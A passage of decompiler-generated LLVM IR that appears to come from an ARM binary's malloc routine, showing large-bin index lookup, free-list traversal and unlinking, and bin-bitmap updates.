dec_label_pc_16d9c:                               ; preds = %dec_label_pc_16d5c, %dec_label_pc_16d50, %dec_label_pc_16d48, %dec_label_pc_16d34
  %v9_16d9c = icmp eq i32 %v1_16d3c, %v0_16d38
  %v2_16da0 = add i32 %v3_16d40, 8
  %v3_16da0 = inttoptr i32 %v2_16da0 to i32*
  store i32 %v0_16da0, i32* %v3_16da0, align 4
  %v0_16da4 = load i32, i32* %ip.global-to-local, align 4
  %v1_16da4 = load i32, i32* %r5.global-to-local, align 4
  %v2_16da4 = add i32 %v1_16da4, 12
  %v3_16da4 = inttoptr i32 %v2_16da4 to i32*
  store i32 %v0_16da4, i32* %v3_16da4, align 4
  br i1 %v9_16d9c, label %dec_label_pc_16efc.loopexit, label %dec_label_pc_16db8

dec_label_pc_16db8:                               ; preds = %dec_label_pc_16d9c
  %v0_16db8 = load i32, i32* %r4.global-to-local, align 4
  %tmp205 = icmp ugt i32 %v0_16db8, 255
  br i1 %tmp205, label %dec_label_pc_16ddc, label %dec_label_pc_16dc0

dec_label_pc_16dc0:                               ; preds = %dec_label_pc_16db8
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  %v1_16dc4 = load i32, i32* %r8.global-to-local, align 4
  %v2_16dc4 = add i32 %v1_16dc4, ptrtoint (i32* @global_var_32024.1324 to i32)
  %v3_16dc4 = inttoptr i32 %v2_16dc4 to i32*
  %v4_16dc4 = load i32, i32* %v3_16dc4, align 4
  %v3_16dc8 = udiv i32 %v0_16db8, 8
  store i32 %v3_16dc8, i32* %r0.global-to-local, align 4
  %v4_16dcc = mul nuw i32 %v3_16dc8, 8
  %v5_16dcc = add i32 %v4_16dc4, %v4_16dcc
  store i32 %v5_16dcc, i32* %r3.global-to-local, align 4
  %v1_16dd0 = add i32 %v5_16dcc, 44
  store i32 %v1_16dd0, i32* %ip.global-to-local, align 4
  %v1_16dd4 = add i32 %v5_16dcc, 52
  %v2_16dd4 = inttoptr i32 %v1_16dd4 to i32*
  %v3_16dd4 = load i32, i32* %v2_16dd4, align 4
  store i32 %v3_16dd4, i32* @lr, align 4
  br label %dec_label_pc_16e34

dec_label_pc_16ddc:                               ; preds = %dec_label_pc_16db8
  store i32 %v0_16db8, i32* %r0.global-to-local, align 4
  %v1_16de0 = call i32 @__malloc_largebin_index(i32 %v0_16db8)
  store i32 %v1_16de0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %ip.global-to-local, align 4
  %v1_16de8 = load i32, i32* %r8.global-to-local, align 4
  %v2_16de8 = add i32 %v1_16de8, ptrtoint (i32* @global_var_32024.1324 to i32)
  %v3_16de8 = inttoptr i32 %v2_16de8 to i32*
  %v4_16de8 = load i32, i32* %v3_16de8, align 4
  %v4_16dec = mul i32 %v1_16de0, 8
  %v5_16dec = add i32 %v4_16de8, %v4_16dec
  store i32 %v5_16dec, i32* %r3.global-to-local, align 4
  %v1_16df0 = add i32 %v5_16dec, 44
  store i32 %v1_16df0, i32* %ip.global-to-local, align 4
  %v1_16df4 = add i32 %v5_16dec, 52
  %v2_16df4 = inttoptr i32 %v1_16df4 to i32*
  %v3_16df4 = load i32, i32* %v2_16df4, align 4
  store i32 %v3_16df4, i32* @lr, align 4
  %v9_16df8 = icmp eq i32 %v3_16df4, %v1_16df0
  br i1 %v9_16df8, label %dec_label_pc_16e34, label %dec_label_pc_16e00

dec_label_pc_16e00:                               ; preds = %dec_label_pc_16ddc
  %v1_16e00 = add i32 %v5_16dec, 56
  %v2_16e00 = inttoptr i32 %v1_16e00 to i32*
  %v3_16e00 = load i32, i32* %v2_16e00, align 4
  store i32 %v3_16e00, i32* %r1.global-to-local, align 4
  %v1_16e04 = add i32 %v3_16e00, 4
  %v2_16e04 = inttoptr i32 %v1_16e04 to i32*
  %v3_16e04 = load i32, i32* %v2_16e04, align 4
  store i32 %v3_16e04, i32* %r3.global-to-local, align 4
  %v0_16e08 = load i32, i32* %r4.global-to-local, align 4
  %v3_16e08 = icmp ult i32 %v0_16e08, %v3_16e04
  br i1 %v3_16e08, label %.thread, label %dec_label_pc_16e24.preheader

.thread:                                          ; preds = %dec_label_pc_16e00
  store i32 %v1_16df0, i32* @lr, align 4
  store i32 %v3_16e00, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16e34

dec_label_pc_16e24.preheader:                     ; preds = %dec_label_pc_16e00
  %v2_16e10 = or i32 %v0_16e08, 1
  store i32 %v2_16e10, i32* %r2.global-to-local, align 4
  %v1_16e24179 = add i32 %v3_16df4, 4
  %v2_16e24180 = inttoptr i32 %v1_16e24179 to i32*
  %v3_16e24181 = load i32, i32* %v2_16e24180, align 4
  store i32 %v3_16e24181, i32* %r3.global-to-local, align 4
  %v3_16e28183 = icmp ult i32 %v2_16e10, %v3_16e24181
  br i1 %v3_16e28183, label %dec_label_pc_16e20, label %dec_label_pc_16e30

dec_label_pc_16e20:                               ; preds = %dec_label_pc_16e24.preheader, %dec_label_pc_16e20
  %v0_16e30184 = phi i32 [ %v3_16e20, %dec_label_pc_16e20 ], [ %v3_16df4, %dec_label_pc_16e24.preheader ]
  %v1_16e20 = add i32 %v0_16e30184, 8
  %v2_16e20 = inttoptr i32 %v1_16e20 to i32*
  %v3_16e20 = load i32, i32* %v2_16e20, align 4
  store i32 %v3_16e20, i32* @lr, align 4
  %v1_16e24 = add i32 %v3_16e20, 4
  %v2_16e24 = inttoptr i32 %v1_16e24 to i32*
  %v3_16e24 = load i32, i32* %v2_16e24, align 4
  store i32 %v3_16e24, i32* %r3.global-to-local, align 4
  %v3_16e28 = icmp ult i32 %v2_16e10, %v3_16e24
  br i1 %v3_16e28, label %dec_label_pc_16e20, label %dec_label_pc_16e30

dec_label_pc_16e30:                               ; preds = %dec_label_pc_16e20, %dec_label_pc_16e24.preheader
  %v0_16e30.lcssa = phi i32 [ %v3_16df4, %dec_label_pc_16e24.preheader ], [ %v3_16e20, %dec_label_pc_16e20 ]
  %v1_16e30 = add i32 %v0_16e30.lcssa, 12
  %v2_16e30 = inttoptr i32 %v1_16e30 to i32*
  %v3_16e30 = load i32, i32* %v2_16e30, align 4
  store i32 %v3_16e30, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16e34

dec_label_pc_16e34:                               ; preds = %.thread, %dec_label_pc_16ddc, %dec_label_pc_16dc0, %dec_label_pc_16e30
  %v0_16e54 = phi i32 [ %v1_16df0, %dec_label_pc_16ddc ], [ %v1_16dd0, %dec_label_pc_16dc0 ], [ %v3_16e30, %dec_label_pc_16e30 ], [ %v3_16e00, %.thread ]
  %v0_16e48 = phi i32 [ %v1_16de0, %dec_label_pc_16ddc ], [ %v3_16dc8, %dec_label_pc_16dc0 ], [ %v1_16de0, %dec_label_pc_16e30 ], [ %v1_16de0, %.thread ]
  %v1_16e38 = phi i32 [ %v1_16de8, %dec_label_pc_16ddc ], [ %v1_16dc4, %dec_label_pc_16dc0 ], [ %v1_16de8, %dec_label_pc_16e30 ], [ %v1_16de8, %.thread ]
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r2.global-to-local, align 4
  %v2_16e38 = add i32 %v1_16e38, ptrtoint (i32* @global_var_32024.1324 to i32)
  %v3_16e38 = inttoptr i32 %v2_16e38 to i32*
  %v4_16e38 = load i32, i32* %v3_16e38, align 4
  %v3_16e3c = sdiv i32 %v0_16e48, 32
  store i32 %v3_16e3c, i32* %r3.global-to-local, align 4
  %v4_16e40 = mul nsw i32 %v3_16e3c, 4
  %v5_16e40 = add i32 %v4_16e38, %v4_16e40
  store i32 %v5_16e40, i32* %r1.global-to-local, align 4
  %v1_16e44 = add i32 %v5_16e40, 820
  %v2_16e44 = inttoptr i32 %v1_16e44 to i32*
  %v3_16e44 = load i32, i32* %v2_16e44, align 4
  %v1_16e48 = urem i32 %v0_16e48, 32
  store i32 %v1_16e48, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_16e50 = shl i32 1, %v1_16e48
  %v8_16e50 = or i32 %v3_16e44, %v7_16e50
  store i32 %v8_16e50, i32* %r3.global-to-local, align 4
  %v1_16e54 = load i32, i32* @r6, align 4
  %v2_16e54 = add i32 %v1_16e54, 12
  %v3_16e54 = inttoptr i32 %v2_16e54 to i32*
  store i32 %v0_16e54, i32* %v3_16e54, align 4
  %v0_16e58 = load i32, i32* @lr, align 4
  %v1_16e58 = load i32, i32* @r6, align 4
  %v2_16e58 = add i32 %v1_16e58, 8
  %v3_16e58 = inttoptr i32 %v2_16e58 to i32*
  store i32 %v0_16e58, i32* %v3_16e58, align 4
  %v0_16e5c = load i32, i32* %r3.global-to-local, align 4
  %v1_16e5c = load i32, i32* %r1.global-to-local, align 4
  %v2_16e5c = add i32 %v1_16e5c, 820
  %v3_16e5c = inttoptr i32 %v2_16e5c to i32*
  store i32 %v0_16e5c, i32* %v3_16e5c, align 4
  %v0_16e60 = load i32, i32* @r6, align 4
  %v1_16e60 = load i32, i32* @lr, align 4
  %v2_16e60 = add i32 %v1_16e60, 12
  %v3_16e60 = inttoptr i32 %v2_16e60 to i32*
  store i32 %v0_16e60, i32* %v3_16e60, align 4
  %v0_16e64 = load i32, i32* @r6, align 4
  %v1_16e64 = load i32, i32* %ip.global-to-local, align 4
  %v2_16e64 = add i32 %v1_16e64, 8
  %v3_16e64 = inttoptr i32 %v2_16e64 to i32*
  store i32 %v0_16e64, i32* %v3_16e64, align 4
  %v0_16e80.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16e80

dec_label_pc_16e6c:                               ; preds = %dec_label_pc_16d0c, %dec_label_pc_16cc4, %dec_label_pc_16d20
  store i32 72, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r1.global-to-local, align 4
  %v4_16e74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_16e74, i32* @sb, align 4
  %v0_16e78 = load i32, i32* @sl, align 4
  %v1_16e78 = add i32 %v0_16e78, 16
  store i32 %v1_16e78, i32* @fp, align 4
  %v1_16e7c = add i32 %v4_16e74, 52
  store i32 %v1_16e7c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_16e80

dec_label_pc_16e80:                               ; preds = %dec_label_pc_16e34, %dec_label_pc_16e6c
  %v0_16da0 = phi i32 [ %v0_16e80.pre, %dec_label_pc_16e34 ], [ %v1_16e7c, %dec_label_pc_16e6c ]
  %v1_16e80 = add i32 %v0_16da0, 12
  %v2_16e80 = inttoptr i32 %v1_16e80 to i32*
  %v3_16e80 = load i32, i32* %v2_16e80, align 4
  store i32 %v3_16e80, i32* @r6, align 4
  %v9_16e84 = icmp eq i32 %v3_16e80, %v0_16da0
  br i1 %v9_16e84, label %dec_label_pc_16e8c, label %dec_label_pc_16d34

dec_label_pc_16e8c:                               ; preds = %dec_label_pc_16e80
  %v0_16e8c = load i32, i32* @sl, align 4
  %tmp206 = icmp ult i32 %v0_16e8c, 256
  %v0_16f44.pre = load i32, i32* @r7, align 4
  br i1 %tmp206, label %dec_label_pc_16e8c.dec_label_pc_16f44_crit_edge, label %dec_label_pc_16e94

dec_label_pc_16e8c.dec_label_pc_16f44_crit_edge:  ; preds = %dec_label_pc_16e8c
  %.pre200 = mul i32 %v0_16f44.pre, 8
  br label %dec_label_pc_16f44

dec_label_pc_16e94:                               ; preds = %dec_label_pc_16e8c
  %v4_16e94 = mul i32 %v0_16f44.pre, 8
  %v5_16e94 = add i32 %v4_16e94, %v0_16da0
  store i32 %v5_16e94, i32* %r3.global-to-local, align 4
  %v1_16e98 = add i32 %v5_16e94, -8
  store i32 %v1_16e98, i32* %r1.global-to-local, align 4
  %v1_16e9c = add i32 %v5_16e94, 4
  %v2_16e9c = inttoptr i32 %v1_16e9c to i32*
  %storemerge.pre = load i32, i32* %v2_16e9c, align 4
  br label %dec_label_pc_16f3c

dec_label_pc_16ea4:                               ; preds = %dec_label_pc_16f3c
  %v1_16ea4 = add i32 %v1_16ecc, 4
  %v2_16ea4 = inttoptr i32 %v1_16ea4 to i32*
  %v3_16ea4 = load i32, i32* %v2_16ea4, align 4
  store i32 %v3_16ea4, i32* %r3.global-to-local, align 4
  %v1_16ea8 = and i32 %v3_16ea4, -4
  store i32 %v1_16ea8, i32* %r2.global-to-local, align 4
  %v3_16eac = icmp ult i32 %v1_16ea8, %v0_16e8c
  %v1_16eb0 = add i32 %v1_16ecc, 12
  %v2_16eb0 = inttoptr i32 %v1_16eb0 to i32*
  %v3_16eb0 = load i32, i32* %v2_16eb0, align 4
  store i32 %v3_16eb0, i32* %r0.global-to-local, align 4
  br i1 %v3_16eac, label %dec_label_pc_16f3c, label %dec_label_pc_16eb8

dec_label_pc_16eb8:                               ; preds = %dec_label_pc_16ea4
  %v1_16eb8 = add i32 %v1_16ecc, 8
  %v2_16eb8 = inttoptr i32 %v1_16eb8 to i32*
  %v3_16eb8 = load i32, i32* %v2_16eb8, align 4
  store i32 %v3_16eb8, i32* %r1.global-to-local, align 4
  %v1_16ebc = add i32 %v3_16eb8, 12
  %v2_16ebc = inttoptr i32 %v1_16ebc to i32*
  %v3_16ebc = load i32, i32* %v2_16ebc, align 4
  store i32 %v3_16ebc, i32* %r3.global-to-local, align 4
  %v9_16ec0 = icmp eq i32 %v3_16ebc, %v1_16ecc
  br i1 %v9_16ec0, label %dec_label_pc_16ec8, label %dec_label_pc_16ed4

dec_label_pc_16ec8:                               ; preds = %dec_label_pc_16eb8
  %v1_16ec8 = add i32 %v3_16eb0, 8
  %v2_16ec8 = inttoptr i32 %v1_16ec8 to i32*
  %v3_16ec8 = load i32, i32* %v2_16ec8, align 4
  store i32 %v3_16ec8, i32* %r3.global-to-local, align 4
  %v9_16ecc = icmp eq i32 %v3_16ec8, %v1_16ecc
  br i1 %v9_16ecc, label %dec_label_pc_16ed8, label %dec_label_pc_16ed4

dec_label_pc_16ed4:                               ; preds = %dec_label_pc_16eb8, %dec_label_pc_16ec8
  %v0_16ed4 = call i32 @abort()
  store i32 %v0_16ed4, i32* %r0.global-to-local, align 4
  %v0_16ed8.pre = load i32, i32* @sl, align 4
  %v1_16ed8.pre = load i32, i32* @r2, align 4
  %v0_16ee0.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_16ed8

dec_label_pc_16ed8:                               ; preds = %dec_label_pc_16ec8, %dec_label_pc_16ed4
  %v1_16ee0 = phi i32 [ %v3_16eb0, %dec_label_pc_16ec8 ], [ %v0_16ed4, %dec_label_pc_16ed4 ]
  %v0_16ee0 = phi i32 [ %v3_16eb8, %dec_label_pc_16ec8 ], [ %v0_16ee0.pre, %dec_label_pc_16ed4 ]
  %v1_16ed8 = phi i32 [ %v1_16ea8, %dec_label_pc_16ec8 ], [ %v1_16ed8.pre, %dec_label_pc_16ed4 ]
  %v0_16ed8 = phi i32 [ %v0_16e8c, %dec_label_pc_16ec8 ], [ %v0_16ed8.pre, %dec_label_pc_16ed4 ]
  %v2_16ed8 = sub i32 %v1_16ed8, %v0_16ed8
  store i32 %v2_16ed8, i32* %lr.global-to-local, align 4
  %v2_16ee0 = add i32 %v1_16ee0, 8
  %v3_16ee0 = inttoptr i32 %v2_16ee0 to i32*
  store i32 %v0_16ee0, i32* %v3_16ee0, align 4
  %v0_16ee4 = load i32, i32* %r0.global-to-local, align 4
  %v1_16ee4 = load i32, i32* %r1.global-to-local, align 4
  %v2_16ee4 = add i32 %v1_16ee4, 12
  %v3_16ee4 = inttoptr i32 %v2_16ee4 to i32*
  store i32 %v0_16ee4, i32* %v3_16ee4, align 4
  %v0_16ee8 = load i32, i32* %ip.global-to-local, align 4
  %v1_16ee8 = add i32 %v0_16ee8, 8
  store i32 %v1_16ee8, i32* %r0.global-to-local, align 4
  %tmp207 = icmp ugt i32 %v2_16ed8, 15
  br i1 %tmp207, label %dec_label_pc_16f08, label %dec_label_pc_16ef0

dec_label_pc_16ef0:                               ; preds = %dec_label_pc_16ed8
  %v1_16ef0 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ef0 = add i32 %v1_16ef0, %v0_16ee8
  store i32 %v2_16ef0, i32* %r2.global-to-local, align 4
  %v1_16ef4 = add i32 %v2_16ef0, 4
  %v2_16ef4 = inttoptr i32 %v1_16ef4 to i32*
  %v3_16ef4 = load i32, i32* %v2_16ef4, align 4
  store i32 %v3_16ef4, i32* %r3.global-to-local, align 4
  store i32 %v1_16ee8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16efc

dec_label_pc_16efc.loopexit:                      ; preds = %dec_label_pc_16d9c
  %v1_16da8 = load i32, i32* @r6, align 4
  %v2_16da8 = load i32, i32* @sl, align 4
  %v3_16da8 = add i32 %v2_16da8, %v1_16da8
  store i32 %v3_16da8, i32* %r2.global-to-local, align 4
  %v2_16dac = add i32 %v3_16da8, 4
  %v3_16dac = inttoptr i32 %v2_16dac to i32*
  %v4_16dac = load i32, i32* %v3_16dac, align 4
  store i32 %v4_16dac, i32* %r3.global-to-local, align 4
  %v2_16db0 = add i32 %v1_16da8, 8
  store i32 %v2_16db0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16efc

dec_label_pc_16efc:                               ; preds = %.dec_label_pc_16efc_crit_edge, %dec_label_pc_16efc.loopexit, %dec_label_pc_16ef0
  %v1_16f00 = phi i32 [ %v4_17024, %.dec_label_pc_16efc_crit_edge ], [ %v3_16da8, %dec_label_pc_16efc.loopexit ], [ %v2_16ef0, %dec_label_pc_16ef0 ]
  %v0_16efc = phi i32 [ %v7_17024, %.dec_label_pc_16efc_crit_edge ], [ %v4_16dac, %dec_label_pc_16efc.loopexit ], [ %v3_16ef4, %dec_label_pc_16ef0 ]
  %v1_16efc = or i32 %v0_16efc, 1
  store i32 %v1_16efc, i32* %r3.global-to-local, align 4
  %v2_16f00 = add i32 %v1_16f00, 4
  %v3_16f00 = inttoptr i32 %v2_16f00 to i32*
  store i32 %v1_16efc, i32* %v3_16f00, align 4
  br label %dec_label_pc_174c4

dec_label_pc_16f08:                               ; preds = %dec_label_pc_16ed8
  %v1_16f08 = load i32, i32* @sl, align 4
  %v2_16f08 = add i32 %v1_16f08, %v0_16ee8
  store i32 %v2_16f08, i32* %r2.global-to-local, align 4
  %v1_16f0c = or i32 %v1_16f08, 1
  store i32 %v1_16f0c, i32* %r3.global-to-local, align 4
  %v0_16f10 = load i32, i32* %lr.global-to-local, align 4
  %v1_16f10 = or i32 %v0_16f10, 1
  store i32 %v1_16f10, i32* %r1.global-to-local, align 4
  store i32 %v1_16ee8, i32* %r4.global-to-local, align 4
  %v2_16f18 = add i32 %v0_16ee8, 4
  %v3_16f18 = inttoptr i32 %v2_16f18 to i32*
  store i32 %v1_16f0c, i32* %v3_16f18, align 4
  %v0_16f1c = load i32, i32* %r2.global-to-local, align 4
  %v1_16f1c = load i32, i32* @r6, align 4
  %v2_16f1c = add i32 %v1_16f1c, 8
  %v3_16f1c = inttoptr i32 %v2_16f1c to i32*
  store i32 %v0_16f1c, i32* %v3_16f1c, align 4
  %v0_16f20 = load i32, i32* %r2.global-to-local, align 4
  %v1_16f20 = load i32, i32* @r6, align 4
  %v2_16f20 = add i32 %v1_16f20, 12
  %v3_16f20 = inttoptr i32 %v2_16f20 to i32*
  store i32 %v0_16f20, i32* %v3_16f20, align 4
  %v0_16f24 = load i32, i32* %lr.global-to-local, align 4
  %v1_16f24 = load i32, i32* %r2.global-to-local, align 4
  %v3_16f24 = add i32 %v1_16f24, %v0_16f24
  %v4_16f24 = inttoptr i32 %v3_16f24 to i32*
  store i32 %v0_16f24, i32* %v4_16f24, align 4
  %v0_16f28 = load i32, i32* %r1.global-to-local, align 4
  %v1_16f28 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f28 = add i32 %v1_16f28, 4
  %v3_16f28 = inttoptr i32 %v2_16f28 to i32*
  store i32 %v0_16f28, i32* %v3_16f28, align 4
  %v0_16f2c = load i32, i32* @r6, align 4
  %v1_16f2c = load i32, i32* %r2.global-to-local, align 4
  %v2_16f2c = add i32 %v1_16f2c, 12
  %v3_16f2c = inttoptr i32 %v2_16f2c to i32*
  store i32 %v0_16f2c, i32* %v3_16f2c, align 4
  %v0_16f30 = load i32, i32* @r6, align 4
  %v1_16f30 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f30 = add i32 %v1_16f30, 8
  %v3_16f30 = inttoptr i32 %v2_16f30 to i32*
  store i32 %v0_16f30, i32* %v3_16f30, align 4
  br label %dec_label_pc_174c4

dec_label_pc_16f3c:                               ; preds = %dec_label_pc_16ea4, %dec_label_pc_16e94
  %v1_16ecc = phi i32 [ %storemerge.pre, %dec_label_pc_16e94 ], [ %v3_16eb0, %dec_label_pc_16ea4 ]
  store i32 %v1_16ecc, i32* %ip.global-to-local, align 4
  %v9_16f3c = icmp eq i32 %v1_16ecc, %v1_16e98
  br i1 %v9_16f3c, label %dec_label_pc_16f44.loopexit, label %dec_label_pc_16ea4

dec_label_pc_16f44.loopexit:                      ; preds = %dec_label_pc_16f3c
  br label %dec_label_pc_16f44

dec_label_pc_16f44:                               ; preds = %dec_label_pc_16e8c.dec_label_pc_16f44_crit_edge, %dec_label_pc_16f44.loopexit
  %v4_16f74.pre-phi = phi i32 [ %.pre200, %dec_label_pc_16e8c.dec_label_pc_16f44_crit_edge ], [ %v4_16e94, %dec_label_pc_16f44.loopexit ]
  %v1_16f44 = add i32 %v0_16f44.pre, 1
  store i32 %v1_16f44, i32* %r2.global-to-local, align 4
  %v1_16f48 = urem i32 %v1_16f44, 32
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r0.global-to-local, align 4
  %v6_16f54 = shl i32 1, %v1_16f48
  store i32 %v6_16f54, i32* %ip.global-to-local, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v4_16f5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 72) to i32*), align 4
  store i32 %v4_16f5c, i32* %r3.global-to-local, align 4
  %v3_16f60 = udiv i32 %v1_16f44, 32
  store i32 %v3_16f60, i32* @r5, align 4
  %v4_16f64 = mul nuw nsw i32 %v3_16f60, 4
  %v5_16f64 = add i32 %v4_16f5c, %v4_16f64
  store i32 %v5_16f64, i32* %r2.global-to-local, align 4
  %v1_16f68 = add i32 %v5_16f64, 820
  %v2_16f68 = inttoptr i32 %v1_16f68 to i32*
  %v3_16f68 = load i32, i32* %v2_16f68, align 4
  store i32 %v3_16f68, i32* @r4, align 4
  %v1_16f6c = add i32 %v4_16f5c, 52
  store i32 %v1_16f6c, i32* %r3.global-to-local, align 4
  store i32 72, i32* @r8, align 4
  %v5_16f74 = add i32 %v1_16f6c, %v4_16f74.pre-phi
  store i32 %v5_16f74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16f78

dec_label_pc_16f78:                               ; preds = %dec_label_pc_16fe0, %dec_label_pc_16f44
  %v1_16f80 = phi i32 [ %v1_16f80.pre, %dec_label_pc_16fe0 ], [ %v3_16f68, %dec_label_pc_16f44 ]
  %v0_16f80 = phi i32 [ %v0_16f78.pre, %dec_label_pc_16fe0 ], [ %v6_16f54, %dec_label_pc_16f44 ]
  %v1_16f78 = sub i32 1, %v0_16f80
  %v2_16f78 = icmp ult i32 %v0_16f80, 2
  %v1_16f78. = select i1 %v2_16f78, i32 %v1_16f78, i32 0
  store i32 %v1_16f78., i32* %r3.global-to-local, align 4
  %tmp141 = icmp ugt i32 %v0_16f80, %v1_16f80
  br i1 %tmp141, label %.thread12, label %bb142

.thread12:                                        ; preds = %dec_label_pc_16f78
  %v5_16f84 = or i32 %v1_16f78., 1
  store i32 %v5_16f84, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16f90.preheader

bb142:                                            ; preds = %dec_label_pc_16f78
  %v2_16f88 = icmp eq i32 %v1_16f78., 0
  br i1 %v2_16f88, label %.dec_label_pc_16fcc.preheader_crit_edge, label %dec_label_pc_16f90.preheader

.dec_label_pc_16fcc.preheader_crit_edge:          ; preds = %bb142
  %v0_16fc454.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16fcc.preheader

dec_label_pc_16f90.preheader:                     ; preds = %bb142, %.thread12
  %v0_16f90.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16f90

dec_label_pc_16f90:                               ; preds = %dec_label_pc_16f90.preheader, %dec_label_pc_16f9c
  %v0_16f90 = phi i32 [ %v0_16f90.pre, %dec_label_pc_16f90.preheader ], [ %v1_16f90, %dec_label_pc_16f9c ]
  %v1_16f90 = add i32 %v0_16f90, 1
  store i32 %v1_16f90, i32* @r5, align 4
  %tmp208 = icmp ugt i32 %v1_16f90, 2
  br i1 %tmp208, label %dec_label_pc_17070.loopexit, label %dec_label_pc_16f9c

dec_label_pc_16f9c:                               ; preds = %dec_label_pc_16f90
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r3.global-to-local, align 4
  %v1_16fa0 = load i32, i32* @r8, align 4
  %v2_16fa0 = add i32 %v1_16fa0, ptrtoint (i32* @global_var_32024.1324 to i32)
  %v3_16fa0 = inttoptr i32 %v2_16fa0 to i32*
  %v4_16fa0 = load i32, i32* %v3_16fa0, align 4
  store i32 %v4_16fa0, i32* %r2.global-to-local, align 4
  %v4_16fa4 = mul i32 %v1_16f90, 4
  %v5_16fa4 = add i32 %v4_16fa0, %v4_16fa4
  store i32 %v5_16fa4, i32* %r3.global-to-local, align 4
  %v1_16fa8 = add i32 %v5_16fa4, 820
  %v2_16fa8 = inttoptr i32 %v1_16fa8 to i32*
  %v3_16fa8 = load i32, i32* %v2_16fa8, align 4
  store i32 %v3_16fa8, i32* @r4, align 4
  %v2_16fac = icmp eq i32 %v3_16fa8, 0
  br i1 %v2_16fac, label %dec_label_pc_16f90, label %dec_label_pc_16fb4

dec_label_pc_16fb4:                               ; preds = %dec_label_pc_16f9c
  %v4_16fb4 = mul i32 %v1_16f90, 256
  %v5_16fb4 = add i32 %v4_16fa0, %v4_16fb4
  store i32 %v5_16fb4, i32* %r3.global-to-local, align 4
  %v1_16fb8 = add i32 %v5_16fb4, 44
  store i32 %v1_16fb8, i32* %r0.global-to-local, align 4
  %v0_16fbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_16fbc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16fcc.preheader

dec_label_pc_16fcc.preheader:                     ; preds = %.dec_label_pc_16fcc.preheader_crit_edge, %dec_label_pc_16fb4
  %v0_16fc454 = phi i32 [ %v1_16fb8, %dec_label_pc_16fb4 ], [ %v0_16fc454.pre, %.dec_label_pc_16fcc.preheader_crit_edge ]
  %v0_16fe8 = phi i32 [ %v3_16fa8, %dec_label_pc_16fb4 ], [ %v1_16f80, %.dec_label_pc_16fcc.preheader_crit_edge ]
  %ip.promoted = phi i32 [ %v0_16fbc, %dec_label_pc_16fb4 ], [ %v0_16f80, %.dec_label_pc_16fcc.preheader_crit_edge ]
  %v2_16fcc51 = and i32 %ip.promoted, %v0_16fe8
  %v4_16fcc53 = icmp eq i32 %v2_16fcc51, 0
  br i1 %v4_16fcc53, label %dec_label_pc_16fc4, label %dec_label_pc_16fd4

dec_label_pc_16fc4:                               ; preds = %dec_label_pc_16fcc.preheader, %dec_label_pc_16fc4
  %v2_16fc856 = phi i32 [ %v2_16fc8, %dec_label_pc_16fc4 ], [ %ip.promoted, %dec_label_pc_16fcc.preheader ]
  %v0_16fc455 = phi i32 [ %v1_16fc4, %dec_label_pc_16fc4 ], [ %v0_16fc454, %dec_label_pc_16fcc.preheader ]
  %v1_16fc4 = add i32 %v0_16fc455, 8
  %v2_16fc8 = mul i32 %v2_16fc856, 2
  %v2_16fcc = and i32 %v2_16fc8, %v0_16fe8
  %v4_16fcc = icmp eq i32 %v2_16fcc, 0
  br i1 %v4_16fcc, label %dec_label_pc_16fc4, label %dec_label_pc_16fcc.dec_label_pc_16fd4_crit_edge

dec_label_pc_16fcc.dec_label_pc_16fd4_crit_edge:  ; preds = %dec_label_pc_16fc4
  store i32 %v1_16fc4, i32* %r0.global-to-local, align 4
  store i32 %v2_16fc8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_16fd4

dec_label_pc_16fd4:                               ; preds = %dec_label_pc_16fcc.dec_label_pc_16fd4_crit_edge, %dec_label_pc_16fcc.preheader
  %v0_16ff4 = phi i32 [ %v2_16fc8, %dec_label_pc_16fcc.dec_label_pc_16fd4_crit_edge ], [ %ip.promoted, %dec_label_pc_16fcc.preheader ]
  %v0_17018 = phi i32 [ %v1_16fc4, %dec_label_pc_16fcc.dec_label_pc_16fd4_crit_edge ], [ %v0_16fc454, %dec_label_pc_16fcc.preheader ]
  %v1_16fd4 = add i32 %v0_17018, 12
  %v2_16fd4 = inttoptr i32 %v1_16fd4 to i32*
  %v3_16fd4 = load i32, i32* %v2_16fd4, align 4
  store i32 %v3_16fd4, i32* @lr, align 4
  %v9_16fd8 = icmp eq i32 %v3_16fd4, %v0_17018
  br i1 %v9_16fd8, label %dec_label_pc_16fe0, label %dec_label_pc_17000

dec_label_pc_16fe0:                               ; preds = %dec_label_pc_16fd4
  store i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32* %r0.global-to-local, align 4
  %v1_16fe4 = load i32, i32* @r8, align 4
  %v2_16fe4 = add i32 %v1_16fe4, ptrtoint (i32* @global_var_32024.1324 to i32)
  %v3_16fe4 = inttoptr i32 %v2_16fe4 to i32*
  %v4_16fe4 = load i32, i32* %v3_16fe4, align 4
  %v2_16fe8 = sub i32 -1, %v0_16ff4
  %v3_16fe8 = and i32 %v0_16fe8, %v2_16fe8
